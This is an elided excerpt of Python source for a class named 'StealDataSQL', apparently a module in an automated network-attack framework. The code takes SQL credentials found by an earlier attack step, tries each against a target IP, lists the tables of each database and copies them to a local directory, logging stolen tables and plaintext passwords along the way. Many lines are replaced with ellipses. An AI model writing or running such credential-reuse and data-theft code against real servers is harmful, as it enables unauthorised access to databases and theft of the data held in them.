...
class StealDataSQL:
    ...
    def connect_sql(self, ip, username, password, database=None):
        ...
        try:
            ...
            logger.info(
                f"Connected to {ip} via SQL with username {username}"
                + (f" to database {database}" if database else "")
            )
            return engine
        except Exception as e:
            logger.error(
                f"SQL connection error for {ip} with user '{username}' and password '{password}'"
                + (f" to database {database}" if database else "")
                + f": {e}"
            )
            return None
    ...
    def steal_data(self, engine, table, schema, local_dir):
        ...
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info(
                    "Data stealing process interrupted due to orchestrator exit."
                )
                return
        ...
        try:
            if "success" in row.get(self.b_parent_action, ""):
                ...
                if os.path.exists(sqlfile):
                    ...
                    credentials = [
                        (row["User"], row["Password"], row["Database"])
                        for _, row in ip_credentials.iterrows()
                    ]
                    logger.info(
                        f"Found {len(credentials)} credential combinations for {ip}"
                    )
                ...
                def timeout():
                    if not self.sql_connected:
                        logger.error(
                            f"No SQL connection established within 4 minutes for {ip}. Marking as failed."
                        )
                ...
                for username, password, database in credentials:
                    ...
                    try:
                        logger.info(
                            f"Trying credential {username}:{password} for {ip} on database {database}"
                        )
                        ...
                        if engine:
                            ...
                            if tables:
                                for table, schema in tables:
                                    ...
                                    db_engine = self.connect_sql(
                                        ip, username, password, schema
                                    )
                                    if db_engine:
                                        self.steal_data(
                                            db_engine, table, schema, local_dir
                                        )
                                success = True
                                counttables = len(tables)
                                logger.success(
                                    f"Successfully stolen data from {counttables} tables on {ip}:{port}"
                                )
                        ...
                        logger.error(
                            f"Error stealing data from {ip} with user '{username}' on database {database}: {e}"
                        )
